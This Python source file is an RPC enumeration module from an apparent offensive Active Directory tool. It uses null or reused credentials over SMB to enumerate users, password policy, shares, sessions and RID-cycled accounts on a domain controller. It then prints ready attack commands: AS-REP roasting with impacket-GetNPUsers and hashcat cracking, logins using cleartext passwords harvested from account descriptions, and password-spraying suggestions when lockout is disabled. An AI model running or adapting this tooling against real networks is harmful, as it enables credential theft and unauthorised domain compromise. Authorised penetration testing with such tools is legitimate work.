"""
RPC enumeration module — the opportunistic complement to the LDAP modules.

listdap is LDAP-first; this module exists for the common offensive scenario
where the LDAP bind reads the rootDSE but not the directory objects (anonymous
or RestrictAnonymous-limited), while SAMR/LSAT/SRVSVC/WKSSVC over SMB still
leak users, groups, policy, shares and sessions.

Trigger:
  * --rpc            → always run (force), even when LDAP enumeration succeeded
  * --no-rpc         → never run
  * otherwise (auto) → run when the LDAP side came back dry, i.e. the bind is
                       anonymous or no identity objects were readable

Credentials are reused from the LDAP session (password / pass-the-hash /
Kerberos ccache). Each pipe degrades gracefully: a denied or unreachable pipe
is reported as a note, never fatal (on a hardened DC, SAMR null commonly works
while LSAT/SRVSVC/WKSSVC are denied — all handled independently).
"""

from modules.base import BaseModule, ScanContext
from core.output import Severity
from utils import rpc
from utils import exploit_cmds
from utils.highlight import analyze_description, extract_credentials


class RPCModule(BaseModule):
    name = "rpc"
    description = "SAMR/LSAT/SRVSVC/WKSSVC/EPM enumeration (LDAP gap-filler)"

    def run(self, ctx: ScanContext) -> None:
        out = ctx.out
        args = ctx.args

        if getattr(args, "no_rpc", False):
            out.debug("RPC enumeration disabled (--no-rpc)")
            return

        forced   = getattr(args, "rpc", False)
        auth_anon = ctx.conn.auth_result.auth_type.value.lower().startswith("anon")
        ldap_dry = ctx.ldap_identity_count == 0

        if not (forced or auth_anon or ldap_dry):
            out.debug("LDAP enumeration succeeded — skipping RPC "
                      "(use --rpc to force RPC enumeration)")
            return

        out.section("RPC ENUMERATION")
        if auth_anon or ldap_dry:
            out.info("LDAP returned no directory objects — probing RPC "
                     "(SAMR/LSAT/SRVSVC/WKSSVC) as a gap-filler")
        elif forced:
            out.info("RPC enumeration forced (--rpc)")

        p = rpc.params_from_ctx(ctx)
        self._samr(ctx, p)
        self._lsat(ctx, p)
        self._srvsvc(ctx, p)
        self._wkssvc(ctx, p)
        self._epm(ctx, p)

    # -- SAMR ----------------------------------------------------------------
    def _samr(self, ctx, p):
        out = ctx.out
        out.subsection(r"SAMR (\samr) — users, groups, policy")
        r = rpc.samr_enumerate(p)
        if not r.feasible:
            out.warning(f"SAMR not available: {r.reason}")
            return

        out.success(f"SAMR bound ({r.auth_kind} session) — domains: "
                    f"{', '.join(r.domains)}")
        out.counter("Users", len(r.users))

        rows = []
        cred_hits = []
        asrep = []            # NO_PREAUTH → AS-REP roastable
        notreqd = []          # PASSWD_NOTREQD (enabled) → empty-password candidates
        for u in sorted(r.users, key=lambda x: x.rid):
            flags = rpc.samr_flag_summary(u.uac)
            if "NO_PREAUTH" in flags:
                asrep.append(u.name)
            if "PASSWD_NOTREQD" in flags and "DISABLED" not in flags:
                notreqd.append(u.name)
            disp_desc = u.description
            if u.description:
                hl, sev = analyze_description(u.description)
                if sev:
                    disp_desc = hl
                    if sev == "HIGH":
                        cred_hits.append((u.name, u.description))
            rows.append([str(u.rid), u.name, flags, u.pwd_last_set, disp_desc])
            # Machine/trust accounts (name ends in '$') are shown in the table but
            # kept out of the user-list dumps, which target human logins for
            # spraying — matching how the LDAP side separates users vs computers.
            if ctx.dump and not _is_machine(u.name):
                ctx.dump.add_user(u.name)
                if "NO_PREAUTH" in flags:
                    ctx.dump.add_np_user(u.name)

        out.table(["RID", "Name", "Flags", "Pwd Last Set", "Description"], rows,
                  highlight_fn=_user_highlight)

        if r.groups:
            out.counter("Groups", len(r.groups))
        if r.aliases:
            out.counter("Local groups (aliases)", len(r.aliases))

        if r.policy:
            self._policy(out, r.policy)

        # -- Quick Wins --
        headline = (ctx.conn.auth_result.auth_type.value.lower().startswith("anon")
                    or ctx.ldap_identity_count == 0)
        if headline and r.users:
            sample = ", ".join(u.name for u in sorted(r.users, key=lambda x: x.rid)[:8])
            sev = Severity.HIGH if r.auth_kind == "null" else Severity.MEDIUM
            via = "null-session" if r.auth_kind == "null" else r.auth_kind
            ctx.quick_wins.add(
                sev,
                f"LDAP unreadable but SAMR ({via}) enumerates {len(r.users)} users",
                "The directory is locked over LDAP, yet SAMR over SMB leaks the "
                "account database.\n"
                f"           Domain: {', '.join(r.domains)}\n"
                f"           Users:  {sample}"
                + (" …" if len(r.users) > 8 else "") + "\n"
                "           Reproduce:\n"
                f"             impacket-samrdump -no-pass '{p.domain}/@{p.dc_ip}'\n"
                f"             nxc smb {p.dc_ip} -u '' -p '' --users",
            )

        for name, desc in cred_hits:
            creds = extract_credentials(desc)
            cand = creds[0] if creds else "(see description)"
            ctx.quick_wins.add(
                Severity.CRITICAL,
                f"Cleartext credential in SAMR description — {name}",
                f"Password candidate: {cand}\n"
                f"           Full description:   {desc}\n"
                "           Re-run authenticated:\n"
                f"             python3 listdap.py -d {p.domain} -dc {p.dc_ip} "
                f"-u {name} -p '{cand}'",
            )

        if asrep:
            # AS-REP roasting needs no credentials — emit the -no-pass form
            # targeting the discovered accounts (not exploit_cmds.asreproast,
            # which assumes an authenticated session).
            userspec = " ".join(asrep)
            ctx.quick_wins.add(
                Severity.HIGH,
                f"AS-REP roastable account(s) found via SAMR — {', '.join(asrep)}",
                "DONT_REQ_PREAUTH is set; the AS-REP hash is obtainable without "
                "any credentials.\n"
                f"           printf '%s\\n' {userspec} > asrep_users.txt\n"
                f"           impacket-GetNPUsers -no-pass -dc-ip {p.dc_ip} "
                f"-usersfile asrep_users.txt -request -format hashcat "
                f"-outputfile asrep.hashes '{p.domain}/'\n"
                "           hashcat -m 18200 asrep.hashes wordlist.txt",
            )
        if notreqd:
            ctx.quick_wins.add(
                Severity.HIGH,
                f"PASSWD_NOTREQD account(s) via SAMR — {', '.join(notreqd)}",
                "These accounts may have an empty password.\n"
                + exploit_cmds.empty_password(ctx, notreqd),
            )
        if r.policy and r.policy.lockout_threshold == 0:
            ctx.quick_wins.add(
                Severity.MEDIUM,
                "No account-lockout policy (via SAMR) — password spraying is safe",
                exploit_cmds.spray(ctx),
            )

    def _policy(self, out, pol):
        out.subsection("Domain password policy (SAMR)")
        out.kv("Min length", str(pol.min_length))
        out.kv("History", str(pol.history))
        out.kv("Max age (days)",
               "never" if pol.max_age_days is None else str(pol.max_age_days))
        out.kv("Min age (days)", str(pol.min_age_days))
        out.kv("Complexity", str(pol.complexity))
        lock = pol.lockout_threshold
        out.kv("Lockout threshold",
               "disabled (0)" if lock == 0 else str(lock))

    # -- LSAT ----------------------------------------------------------------
    def _lsat(self, ctx, p):
        out = ctx.out
        out.subsection(r"LSAT (\lsarpc) — policy, trusts, RID cycling")
        r = rpc.lsa_enumerate(p)
        if not r.feasible:
            out.warning(f"LSAT not available: {r.reason}")
            return
        if r.domain or r.domain_sid:
            out.kv("Account domain", f"{r.domain}  ({r.domain_sid})")
        if r.whoami:
            out.kv("Authenticated as", r.whoami)
        for name, sid in r.trusts:
            out.kv("Trusted domain", f"{name}  ({sid})")
        if r.principals:
            out.counter("Principals via RID cycling", len(r.principals))
            rows = [[str(rid), name, kind]
                    for rid, name, kind in sorted(r.principals)]
            out.table(["RID", "Name", "Type"], rows)
            if ctx.dump:
                for _, name, kind in r.principals:
                    if kind == "user" and not _is_machine(name):
                        ctx.dump.add_user(name)
        elif r.reason:
            out.warning(f"RID cycling incomplete: {r.reason}")

    # -- SRVSVC --------------------------------------------------------------
    def _srvsvc(self, ctx, p):
        out = ctx.out
        out.subsection(r"SRVSVC (\srvsvc) — shares, sessions")
        r = rpc.srvsvc_enumerate(p)
        if not r.feasible:
            out.warning(f"SRVSVC not available: {r.reason}")
            return
        if r.shares:
            out.counter("Shares", len(r.shares))
            out.table(["Name", "Type", "Remark"],
                      [[n, t, rm] for n, t, rm in r.shares])
        if r.sessions:
            out.counter("Sessions", len(r.sessions))
            out.table(["Client", "User"], [[c, u] for c, u in r.sessions])
        if not r.shares and not r.sessions and r.reason:
            out.warning(f"No data: {r.reason}")

    # -- WKSSVC --------------------------------------------------------------
    def _wkssvc(self, ctx, p):
        out = ctx.out
        out.subsection(r"WKSSVC (\wkssvc) — logged-on users")
        r = rpc.wkssvc_enumerate(p)
        if not r.feasible:
            out.warning(f"WKSSVC not available: {r.reason}")
            return
        if r.logged_on:
            out.counter("Logged-on users", len(r.logged_on))
            for who in r.logged_on:
                out.kv("Session", who)
        else:
            out.info("No logged-on users reported")

    # -- EPM -----------------------------------------------------------------
    def _epm(self, ctx, p):
        out = ctx.out
        out.subsection("EPM (endpoint mapper, tcp/135) — RPC attack surface")
        r = rpc.epm_dump(p)
        if not r.feasible:
            out.warning(f"EPM not available: {r.reason}")
            return
        # Summarize: unique service annotations rather than hundreds of bindings.
        services = {}
        for binding, annot in r.endpoints:
            label = annot or binding.split(":", 1)[0]
            services.setdefault(label, 0)
            services[label] += 1
        out.counter("Registered endpoints", len(r.endpoints),
                    {"distinct services": len(services)})
        notable = [s for s in services
                   if any(k in s.lower() for k in
                          ("drs", "cert", "dnsserver", "spoolss", "efs",
                           "lsa", "samr", "eventlog", "scheduler", "task"))]
        for s in sorted(notable):
            out.kv("Service", s)


def _is_machine(name: str) -> bool:
    """Machine / trust account — excluded from the human-login user dumps."""
    return name.endswith("$")


def _user_highlight(row):
    """Colour rows with pentest-relevant SAMR flags."""
    from core.output import C
    flags = row[2]
    if any(f in flags for f in ("PASSWD_NOTREQD", "NO_PREAUTH", "UNCONSTRAINED_DELEG")):
        return C.YELLOW
    return None
